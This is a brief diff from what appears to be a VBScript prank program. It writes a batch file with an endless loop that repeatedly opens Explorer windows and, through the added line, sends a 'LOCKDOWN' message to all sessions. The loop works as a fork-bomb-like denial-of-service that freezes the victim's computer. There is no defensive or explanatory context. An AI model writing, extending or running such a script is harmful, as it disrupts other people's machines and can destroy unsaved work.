@@ -60,6 +60,7 @@ if intMessage = vbYes Then
 	MyFile.WriteLine("color 3")
 	MyFile.WriteLine(":loop")
 	Myfile.WriteLine("tree ")
+	Myfile.WriteLine("msg * LOCKDOWN")
 	Myfile.WriteLine("start explorer")
 	Myfile.WriteLine("goto loop")
 	MyFile.WriteLine("start chrome https://www.youtube.com/watch?v=Ux5cQbO_ybw")
